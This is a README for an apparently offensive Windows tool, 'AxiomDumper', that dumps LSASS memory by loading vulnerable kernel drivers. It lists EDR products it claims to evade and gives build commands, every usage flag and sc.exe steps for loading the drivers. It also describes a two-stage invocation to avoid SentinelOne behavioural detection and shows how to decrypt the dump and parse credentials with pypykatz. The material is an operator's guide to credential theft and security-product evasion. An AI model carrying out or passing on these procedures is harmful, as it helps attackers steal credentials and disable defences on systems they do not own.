## AxiomDumper
Dump LSASS under EDR scrutiny. All actions are performed in kernel mode through vulnerable drivers, therefore bypassing RunAsPPL protections and almost all userland detections and telemetry.

## Evasion efficiency
| Solution              | Status         |
|-----------------------|:--------------:|
| Defender AV           |  ✅ - OK       |
| Defender for Endpoint |  ✅ - OK       |
| Symantec EDR          |  ✅ - OK       |
| Kaspersky EDR         |  ✅ - OK       |
| Sophos                |  ✅ - OK       |
| Trend Micro           |  ✅ - OK       |
| HarfangLab            |  ✅ - OK       |
| WithSecure            |  ✅ - OK       |
| Cortex XDR            |  ✅ - OK       |
| Sentinel ONE          |  ✅ - OK       |
| Crowdstrike Falcon    |  ✅ - OK       |


## Supported systems
This tool does NOT support Windows workstations versions 8.1 and prior, as well as Server 2012 and prior. Seriously, you are at risk of BSOD here. You've been warned. I also do not intend to try and support it, as those systems are starting to get really old, and benefit appears quite minor.

This tool does not work on Windows 11 and Windows Server 2025. Yet. An update is to come. No risk of BSOD here, the dump will simply be corrupted or fail upon memory pages extraction.

## Known bugs
Sometimes the dump will fail when extracting memory pages and return an error "Breaking on status 0xc000004". I am aware of this bug, and working on a fix. If you happen to see this bug, sending me the specific kernel version that caused it will help me greatly.

## Building the binaries
Install build dependencies:
```bash
$ apt-get update
$ apt-get install make mingw-w64
```

Build the binaries:
```bash
$ make
Precompiling main.o...                            [OK]
[...]

[COMPILATION SUCCESSFUL]

$ ls AxiomDumper.exe unxor
Permissions Size User  Group  Date Modified Name
----------- ---- ----  -----  ------------- ----
.rwxrwx---  1,2M mallo users  9 nov.  15:10  AxiomDumper.exe
.rwxrwx---   16k mallo users  9 nov.  15:04  unxor
```

## Usage
See the help menu for the generic case:
```powershell
PS> .\AxiomDumper.exe /help
Usage: Y:\AxiomDumper.exe /help /unload:{NAME} /mode:[dropfile|netcat|get-kernel-base|get-patch-address] /savepath:{PATH} /autoload:[no|reflective] /driver:[speedfan|lenovo] /patch-address:{ADDRESS} /kernelbase:{ADDRESS}

/help - Displays this message and the currently running kernel version

/mode: - What mode to run in. Can be specified multiple times, but the last mode parsed takes precedence over previous ones
        dropfile - Will extract LSASS memory and drop its content to disk, to the path specified by /savepath:{PATH}
        netcat - Will extract LSASS memory and send its content over the network, to the destination specified by /rhost:{HOST} and /rport:{PORT} (Not implemented)
        get-kernel-base - Prints the current kernel base and exits. This info is needed to evade some EDR.
        get-patch-address - Gets the address iof NtIoDeviceControlFile and exits. This info is needed to evade some EDR.

/savepath:{PATH} - Specifies where to drop the dump file on disk. Required when running in /mode:dropfile.

/autoload: - Sets the driver loading mode.
        no - No autoloading of the driver. The target driver must be loaded manually with sc.exe before running the binary.
        reflective - Performs automatic drop-and-load of the driver, if the EDR profile allows it. Automatically unloads and shreds the driver afterwards.

/unload:{NAME} - Unloads the driver identified by name and exits. Useful if the program crashes or you kill it before it can do so automatically. The service name will be specified in the output by a random 6 characters string when running with /autoload:reflective

/driver: - Specifies which driver to use.
        speedfan - Hardware monitoring driver. Fastest option but detected by Sentinel ONE
        winio - Re-signed WinIO64 driver. Safest but also slower due to many manual memory maping operations.

/patch-address|kernelbase - The tool will automatically tell you to use those options and how if needed.

Examples:
Y:\AxiomDumper.exe /mode:dropfile /savepath:out.bin /autoload:reflective /driver:speedfan -> Use the speedfan driver to drop a XOR-encrypted memory dump in the out.bin file. Automatically load, then unload and shreds the driver from disk.
Y:\AxiomDumper.exe /mode:dropfile /savepath:X:\someshare\exfil.out /driver:winio /autoload:no -> Use the WinIO driver, which must have been loaded manually with sc.exe beforehand
```

### Manually loading the driver
For some EDR, automatically dropping and loading the driver will get detected as a threat (which is correct btw).
So you will need to manually load it with sc.exe utility:
```powershell
PS> cp mah-driver.sys C:\Windows\System32\drivers\sf.sys
PS> sc.exe create sf type= kernel binpath= C:\Windows\System32\drivers\sf.sys
[SC] CreateService SUCCESS
PS> sc.exe start sf

SERVICE_NAME: sf
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```

NOTE: Always drop the driver in `C:\Windows\System32\drivers`. Not anywhere else.

### PLEASE READ
If loading the driver manually, please make sure to always unload it before leaving the machine behind you. Those are vulnerable drivers and you should NEVER leave them loaded into any machine, especially during actual engagements. Plus, you might make it more prone to detection leaving those trails behind you.
```powershell
PS> sc.exe stop sf
SERVICE_NAME: sf
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
PS> rm C:\Windows\System32\drivers\sf.sys
PS>
```

## Decrypting the dump
The dump is encrypted with a simple 0x42 key. I'm sure you'll be able to decrypt it just fine, but for ease-of-use the Makefile will also generate a Linux binary: `unxor`.

Simply run:
```bash
$ ./unxor out.bin out.clear
$ pypykatz lsa minidump out.clear
```

Note: For OPSEC purposes you probably should change that key :)

### Specific case - Sentinel ONE
Sentinel ONE will flag the binary on behavioral analysis if we let it perform normally. Specifically, the chain EnumDeviceDrivers() -> FindKernelBaseAddress() -> re-use that variable somewhere, will trigger a detection.
So instead the attack is divided in two separate invocations:
- The first will extract the kernel base address and print it to stdout then immediatly exit.
- The second will expect the extracted address from the previous run as argument, and use it as if it was calculated normally.

This allows to run the program normally, although I suspect it still triggers LOW IOCs.

This is done with the `/mode:get-kernel-base` and `/kernelbase:{ADDRESS}` arguments. Start by extracting the kernel base address:
```powershell
PS> .\AxiomDumper.exe /mode:get-kernel-base
[...]
Re-run with option: /kernelbase:fffff805dc800000 <-- /!\ this is the important output
```

Then you can run the program by adding all other options:
```powershell
PS> .\AxiomDumper.exe /mode:dropfile /savepath:out.bin /autoload:no /driver:winio /kernelbase:fffff805dc800000
[+] EDR detected ! Adapting profile to Sentinel ONE
[...]
[+] Memory dumped, got 98127778 bytes
```

WARNING: Always, and I mean ALWAYS double check your `/kernelbase` argument. If it is off by even one byte, you will BSOD.

## Evasion techniques

### Compile-time XOR encryption
Most strings (used in printf for instance) are XOR-encrypted at compile time, using are time-based encryption key. They change at each new compilation.

### Compile-time hashing
Hashes are also pre-computed at compile-time.

### Kernel-mode arbitrary code execution
Using physical memory read/write primitives in vulnerable drivers, the tool achieves arbitrary code execution in kernel mode. Don't worry about userland hooks are permission checking in this state.

### EDR-based profiles
If an EDR solution is detected on the target, the arguments are verified against pre-built profiles in order to avoid mistakingly running the binary in a mode that might get flagged.

### Encrypted dump looting
The generated dump is encrypted before sending over the network or dropping it to the disk.

### Plug-and-play driver framework
The provided drivers are now getting detected ? No matter, just plug your own into the code. As long as you have a physical read/write, you can achieve the same effect.

### Light-weight dump
The dumper only extracts needed memory pages in order to have pypykatz parse it successfully. This reduces the dump size by 80-90%.

## Community

Opening issues or pull requests very much welcome.
Suggestions welcome as well.

## License

This software is under GNU GPL 3.0 license (see LICENSE file).
This is a free, copyleft license that allows users to run, study, share, and modify software, provided that all distributed versions and derivatives remain open source under the same license.

